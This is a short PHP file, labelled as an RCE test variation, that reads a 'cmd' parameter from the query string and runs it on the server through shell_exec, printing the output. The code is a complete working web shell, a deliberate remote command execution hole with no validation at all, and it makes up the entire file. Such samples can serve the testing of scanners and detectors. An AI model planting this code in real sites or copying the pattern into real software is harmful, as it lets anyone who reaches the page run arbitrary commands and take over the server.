<?php
// RCE test variation #1354
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>